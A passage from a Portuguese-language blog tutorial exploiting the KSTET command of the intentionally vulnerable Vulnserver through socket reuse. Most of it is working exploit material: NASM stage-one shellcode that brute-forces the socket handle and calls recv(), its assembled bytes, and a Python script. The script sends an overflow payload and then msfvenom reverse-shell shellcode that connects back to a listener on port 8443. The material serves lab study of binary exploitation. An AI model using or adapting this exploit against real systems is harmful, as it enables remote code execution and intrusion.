+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; Movendo o apontador ESP para EBX</span>
+<span class="nf">add</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">64</span>             <span class="c1">; Apontando o EBX para o ESP original para torna-lo apontador para nosso estagio 2</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Push no parametro '*buf' = Apontador para ESP+0x64</span>
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">; Zerando EBX</span>
+<span class="nf">add</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">104</span>            <span class="c1">; Tornano EBX = 104, valor do socket handle</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; push no parametro 's'</span>
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x40252c90</span>     <span class="c1">; Precisamos mover o valor 0040252c para EAX, mas nao podemos inserir o null byte '0x00'</span>
+<span class="nf">shr</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">8</span>              <span class="c1">; Removendo 0x90 do EAX e transformando em 0x0040252c</span>
+<span class="nf">call</span> <span class="nb">eax</span>                <span class="c1">; Cahamdno recv()</span>
+
+</pre></table></code></div></div><p>Tecnicamente preenchemos todos os parâmetros da função recv(), porém temos um problema: o valor do socket é um inteiro criado dinamicamente quando o programa roda.</p><p>Ou seja, enconramos o valor 104, mas na próxima execução ele vai mudar. Para passarmos por este problema, podemos fazer um update em nosso script para fazer um bruteforce do valor do socket iniciando em 0.</p><p>estagio1.nasm:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="c1">; recv()</span>
+
+<span class="nf">sub</span> <span class="nb">esp</span><span class="nv">.</span> <span class="mi">64</span>             <span class="c1">; Move o apontador ESP para o nosso buffer inicial evitando sobrescrever nosso shellcode</span>
+<span class="nf">xor</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">edi</span>            <span class="c1">; Zerando EDI</span>
+<span class="nl">socket_loop:</span>            <span class="c1">; Inicio do bruteforce</span>
+<span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">; Zerando EBX</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Push no parametro 'flags' = 0</span>
+<span class="nf">add</span> <span class="nb">bh</span><span class="p">,</span> <span class="mi">4</span>               <span class="c1">; Tornando EBX = 00000400 = 1024 bytes</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Push do parametro 'len' = 1024 bytes</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">; Movendo o apontador ESP para EBX</span>
+<span class="nf">add</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">64</span>             <span class="c1">; Apontando o EBX para o ESP original para torna-lo apontador para nosso estagio 2</span>
+<span class="nf">push</span> <span class="nb">ebx</span>                <span class="c1">; Push no parametro '*buf' = Apontador para ESP+0x64</span>
+<span class="nf">inc</span> <span class="nb">edi</span>                 <span class="c1">; Tornando EDI = EDI + 1</span>
+<span class="nf">push</span> <span class="nb">edi</span>                <span class="c1">; Push no socket handle = EDI + 1</span>
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x40252c90</span>     <span class="c1">; Precisamos mover o valor 0040252c para EAX, mas nao podemos inserir o null byte '0x00'</span>
+<span class="nf">shr</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">8</span>              <span class="c1">; Removendo 0x90 do EAX e transformando em 0x0040252c</span>
+<span class="nf">call</span> <span class="nb">eax</span>                <span class="c1">; Cahamdno recv()</span>
+<span class="nf">test</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>           <span class="c1">; Checando se a recv() foi teve sucesso</span>
+<span class="nf">jnz</span> <span class="nv">socket_loop</span>         <span class="c1">; Se a recv() foi mal sucedida, volta para o inicio do loop</span>
+</pre></table></code></div></div><p>Agora podemos compilar com o <code class="language-plaintext highlighter-rouge">nasm</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nasm <span class="nt">-f</span> elf32 estagio1.asm <span class="nt">-o</span> estagio1.o
+</pre></table></code></div></div><p>E sanitizar:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>objdump <span class="nt">-d</span> estagio1.o <span class="nt">-M</span> intel | <span class="nb">grep</span> <span class="s1">'^ '</span> | <span class="nb">cut</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'\\x'</span><span class="nv">$i</span><span class="p">;</span><span class="k">done</span>
+<span class="se">\x</span>83<span class="se">\x</span>ec<span class="se">\x</span>40<span class="se">\x</span>31<span class="se">\x</span>ff<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>53<span class="se">\x</span>80<span class="se">\x</span>c7<span class="se">\x</span>04<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>83<span class="se">\x</span>c3<span class="se">\x</span>40<span class="se">\x</span>53<span class="se">\x</span>47<span class="se">\x</span>57<span class="se">\x</span>b8<span class="se">\x</span>90<span class="se">\x</span>2c<span class="se">\x</span>25<span class="se">\x</span>40<span class="se">\x</span>c1<span class="se">\x</span>e8<span class="se">\x</span>08<span class="se">\x</span>ff<span class="se">\x</span>d0<span class="se">\x</span>85<span class="se">\x</span>c0<span class="se">\x</span>75
+</pre></table></code></div></div><p>Temos um estágio 1 de apenas 34 bytes que cabe perfeitamente em nosso buffer, vamos atualizar nosso script.</p><p>xplkstet.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="n">socket</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># variaveis de payload
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">206</span>
+
+<span class="n">estagio1</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x83\xec\x40\x31\xff\x31\xdb\x53\x80\xc7\x04\x53\x89\xe3\x83\xc3\x40\x53\x47\x57\xb8\x90\x2c\x25\x40\xc1\xe8\x08\xff\xd0\x85\xc0\x75\xe3</span><span class="sh">"</span>
+
+<span class="c1"># payload
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">KSTET </span><span class="sh">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">5</span> <span class="c1"># padding do estagio 1
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">estagio1</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">70</span> <span class="o">-</span> <span class="mi">5</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">estagio1</span><span class="p">))</span> <span class="c1"># buffer inicial
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd3\x11\x50\x62</span><span class="sh">"</span> <span class="c1"># JMP ESP
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xeb\xb4</span><span class="sh">"</span> <span class="c1"># short jump
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90\x90</span><span class="sh">"</span> <span class="c1"># padding do short jump
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">70</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="c1"># complemento do buffer
+</span>
+<span class="c1"># primeiro estagio
+</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Enviando primeiro estagio...</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</pre></table></code></div></div><h2 id="estágio-2-injetando-o-reverse-shell">ESTÁGIO 2: INJETANDO O REVERSE SHELL</h2><p>Nosso primeiro estágio já consumiu quase todo nosso pequeno buffer, como podemos enviar nosso próximo estágio?</p><p>Vamos usar lógica, o vulnserver é um servidor TCP, logo, ele aceita multiplas conexões, então podemos criar duas conexões distintas e enviar cada estágio em uma consexão.</p><p>Tudo que precisamos fazer agora é criar nosso reverse shell e enviá-lo logo após nosso primeiro estágio.</p><p>xplkstet.py:</p><div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+
+<span class="c1"># variaveis de conexao
+</span><span class="n">ip</span> <span class="o">=</span> <span class="sh">"</span><span class="s">192.168.1.30</span><span class="sh">"</span>
+<span class="n">porta</span> <span class="o">=</span> <span class="mi">9999</span>
+
+<span class="c1"># variaveis de payload
+</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">206</span>
+
+<span class="n">estagio1</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x83\xec\x40\x31\xff\x31\xdb\x53\x80\xc7\x04\x53\x89\xe3\x83\xc3\x40\x53\x47\x57\xb8\x90\x2c\x25\x40\xc1\xe8\x08\xff\xd0\x85\xc0\x75\xe3</span><span class="sh">"</span>
+
+<span class="c1"># msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.17 lport=8443 exitfunc=thread -b '\x00' -v shellcode -f py
+</span>
+<span class="n">shellcode</span> <span class="o">=</span>  <span class="sa">b</span><span class="sh">""</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xbf\x3c\xce\x60\x4f\xdb\xd3\xd9\x74\x24\xf4</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x58\x33\xc9\xb1\x52\x83\xc0\x04\x31\x78\x0e</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x03\x44\xc0\x82\xba\x48\x34\xc0\x45\xb0\xc5</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xa5\xcc\x55\xf4\xe5\xab\x1e\xa7\xd5\xb8\x72</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x44\x9d\xed\x66\xdf\xd3\x39\x89\x68\x59\x1c</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xa4\x69\xf2\x5c\xa7\xe9\x09\xb1\x07\xd3\xc1</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc4\x46\x14\x3f\x24\x1a\xcd\x4b\x9b\x8a\x7a</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x01\x20\x21\x30\x87\x20\xd6\x81\xa6\x01\x49</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x99\xf0\x81\x68\x4e\x89\x8b\x72\x93\xb4\x42</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x09\x67\x42\x55\xdb\xb9\xab\xfa\x22\x76\x5e</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x02\x63\xb1\x81\x71\x9d\xc1\x3c\x82\x5a\xbb</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x9a\x07\x78\x1b\x68\xbf\xa4\x9d\xbd\x26\x2f</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x91\x0a\x2c\x77\xb6\x8d\xe1\x0c\xc2\x06\x04</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc2\x42\x5c\x23\xc6\x0f\x06\x4a\x5f\xea\xe9</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x73\xbf\x55\x55\xd6\xb4\x78\x82\x6b\x97\x14</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x67\x46\x27\xe5\xef\xd1\x54\xd7\xb0\x49\xf2</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x5b\x38\x54\x05\x9b\x13\x20\x99\x62\x9c\x51</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xb0\xa0\xc8\x01\xaa\x01\x71\xca\x2a\xad\xa4</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x5d\x7a\x01\x17\x1e\x2a\xe1\xc7\xf6\x20\xee</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x38\xe6\x4b\x24\x51\x8d\xb6\xaf\x9e\xfa\xb9</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x3e\x77\xf9\xb9\x60\x7c\x74\x5f\x0a\x92\xd1</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc8\xa3\x0b\x78\x82\x52\xd3\x56\xef\x55\x5f</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x55\x10\x1b\xa8\x10\x02\xcc\x58\x6f\x78\x5b</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x66\x45\x14\x07\xf5\x02\xe4\x4e\xe6\x9c\xb3</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x07\xd8\xd4\x51\xba\x43\x4f\x47\x47\x15\xa8</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc3\x9c\xe6\x37\xca\x51\x52\x1c\xdc\xaf\x5b</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x18\x88\x7f\x0a\xf6\x66\xc6\xe4\xb8\xd0\x90</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x5b\x13\xb4\x65\x90\xa4\xc2\x69\xfd\x52\x2a</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xdb\xa8\x22\x55\xd4\x3c\xa3\x2e\x08\xdd\x4c</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe5\x88\xfd\xae\x2f\xe5\x95\x76\xba\x44\xf8</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x88\x11\x8a\x05\x0b\x93\x73\xf2\x13\xd6\x76</span><span class="sh">"</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xbe\x93\x0b\x0b\xaf\x71\x2b\xb8\xd0\x53</span><span class="sh">"</span>
+
+<span class="n">estagio2</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1024</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="c1"># preenchendo o restante do buffer de 1024 bytes com NOPs
+</span>
+<span class="c1"># payload
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">KSTET </span><span class="sh">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">5</span> <span class="c1"># padding do estagio 1
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">estagio1</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">70</span> <span class="o">-</span> <span class="mi">5</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">estagio1</span><span class="p">))</span> <span class="c1"># buffer inicial
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xd3\x11\x50\x62</span><span class="sh">"</span> <span class="c1"># JMP ESP
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xeb\xb4</span><span class="sh">"</span> <span class="c1"># short jump
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x90\x90</span><span class="sh">"</span> <span class="c1"># padding do short jump
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">C</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">70</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="c1"># complemento do buffer
+</span>
+<span class="c1"># primeiro estagio
+</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">porta</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Enviando primeiro estagio...”)
+s.send(payload + b</span><span class="sh">"</span>\<span class="n">r</span>\<span class="n">n</span><span class="sh">"</span><span class="s">) # ativando o estagio 1
+#s.recv(1024)
+
+sleep(3)
+
+print(</span><span class="sh">"</span><span class="n">Enviando</span> <span class="n">segundo</span> <span class="n">estagio</span><span class="p">...</span><span class="sh">"</span><span class="s">)
+s.send(estagio2)
+print(</span><span class="sh">"</span><span class="n">Payload</span> <span class="n">enviado</span><span class="p">,</span> <span class="n">cheque</span> <span class="n">o</span> <span class="n">netcat</span><span class="err">!</span><span class="sh">"</span><span class="s">)
+</span></pre></table></code></div></div><p>Agora vamos setar o netcat para ouvir a porta 8443, rodar o vulnserver fora do Immunity e testar nosso exploit.</p><p><img data-proofer-ignore data-src="/img/std/winbof/winbof-75.png" alt="Enumaração do comando." /> <img data-proofer-ignore data-src="/img/std/winbof/winbof-76.png" alt="Enumaração do comando." /></p><p>E conseguimos nosso reverse shell.</p><p>Neste comando, tivemos a experiência de um buffer estremamente pequeno, o que nos obrigou a pensar fora da caixa e reaproveitar funções do SO que já estão ativas no programa.</p><p>No próximo comando, vamos experimentar outra restrição.</p><p>GO GO GO!!!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/estudos/'>Estudos</a>, <a href='/categories/windows-buffer-overflow/'>Windows Buffer Overflow</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/binary-exploitation/" class="post-tag no-text-decoration" >Binary Exploitation</a> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >Buffer Overflow</a> <a href="/tags/assembly/" class="post-tag no-text-decoration" >Assembly</a> <a href="/tags/vulnserver/" class="post-tag no-text-decoration" >Vulnserver</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Windows Vulnserver Buffer Overflow - Parte 5 Reuso de Socket - H41stur&url=https://h41stur.github.io/posts/std-winbof-5/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Windows Vulnserver Buffer Overflow - Parte 5 Reuso de Socket - H41stur&u=https://h41stur.github.io/posts/std-winbof-5/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Windows Vulnserver Buffer Overflow - Parte 5 Reuso de Socket - H41stur&url=https://h41stur.github.io/posts/std-winbof-5/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://h41stur.github.io/posts/std-winbof-5/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div><div> <script src="https://utteranc.es/client.js" repo="h41stur/h41stur.github.io" issue-term="url" theme="photon-dark" crossorigin="anonymous" async> </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/process-injection/">Process Injection 101</a><li><a href="/posts/evasao-av/">Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</a><li><a href="/posts/paper-heap/">Heap Exploitation P.1</a><li><a href="/posts/shellcoding101/">Shellcoding 101</a><li><a href="/posts/replay-sinal-rf/">Uma Jornada no Hardware Hacking: Criando um Clonador de Sinais RF</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/std-winbof-1/"><div class="card-body"> <span class="timeago small" >Oct 6, 2021<i class="unloaded">2021-10-06T12:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Windows Vulnserver Buffer Overflow - Parte 1 Objetivos e Análise do Código</h3><div class="text-muted small"><p> BUFFER OVERFLOW EM WINDOWS Neste laboratório, vamos explorar várias técnicas de buffer overflow no SO Windows, o intuito é de entender a mecânica por trás de aplicações e programas e encontrar uma...</p></div></div></a></div><div class="card"> <a href="/posts/std-winbof-2/"><div class="card-body"> <span class="timeago small" >Oct 6, 2021<i class="unloaded">2021-10-06T13:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Windows Vulnserver Buffer Overflow - Parte 2 Simples BOF</h3><div class="text-muted small"><p> COMANDO TRUN O comando TRUN, assim como os demais, recebe um argumento e dá uma resposta. Sabendo de seu funcionamento, precisamos fazer o fuzzing do comando e descobrir se conseguimos causar o...</p></div></div></a></div><div class="card"> <a href="/posts/std-winbof-3/"><div class="card-body"> <span class="timeago small" >Oct 6, 2021<i class="unloaded">2021-10-06T14:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Windows Vulnserver Buffer Overflow - Parte 3 Saltos na Memória</h3><div class="text-muted small"><p> COMANDO GTER O comando GTER, assim como os demais, recebe um argumento e dá uma resposta. Neste comando, temos uma situação parecida com a anterior, porém encontramos uma problema com o espaço dis...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/std-winbof-4/" class="btn btn-outline-primary" prompt="Older"><p>Windows Vulnserver Buffer Overflow - Parte 4 Bypass do SEH</p></a> <a href="/posts/std-winbof-6/" class="btn btn-outline-primary" prompt="Newer"><p>Windows Vulnserver Buffer Overflow - Parte 6 Badchars e Conclusão</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/h41stur">H41stur</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted 